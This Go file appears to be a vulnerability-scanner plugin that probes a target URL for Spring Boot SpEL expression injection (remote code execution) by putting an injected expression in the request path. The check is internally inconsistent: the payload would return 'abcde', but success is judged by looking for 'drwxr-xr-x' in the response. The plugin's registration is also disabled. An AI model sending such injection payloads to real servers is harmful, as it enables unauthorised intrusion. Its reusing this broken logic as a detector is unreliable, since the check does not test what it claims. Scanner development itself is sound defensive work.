package goplugin

import (
	"net/http"
	"strings"
	"vuldb/common"
	"vuldb/plugin"
)

type springBootRCE struct {
	info   common.PluginInfo
	result []common.PluginInfo
}

func init() {
	// plugin.Regist("all", &springBootRCE{})
}
func (d *springBootRCE) Init() common.PluginInfo{
	d.info = common.PluginInfo{
		Name:    "Spring Boot 框架表达式注入",
		Remarks: "Spring Boot框架的SpEL表达式注入，攻击者可在服务器上执行任意命令",
		Level:   0,
		Type:    "RCE",
		Author:   "wolf",
		References: common.References{
			URL: "",
			CVE: "",
		},
	}
	return d.info
}
func (d *springBootRCE) GetResult() []common.PluginInfo {
	return d.result
}
func (d *springBootRCE) Check(URL string, meta plugin.TaskMeta) bool {
	// var checkURL string
	// for _, url := range FileList {
	// 	if strings.Contains(url, ".cgi") {
	// 		checkURL = url
	// 		break
	// 	}
	// }
	// if checkURL == "" {
	// 	return false
	// }
	poc := "${new java.lang.String(new byte[]{97,98,99,100,101})}."
	request, err := http.NewRequest("GET", URL+"/"+poc, nil)
	// request.Header.Set("cookie", poc)
	// request.Header.Set("User-Agent", poc)
	// request.Header.Set("Referrer", poc)
	resp, err := common.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "drwxr-xr-x") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
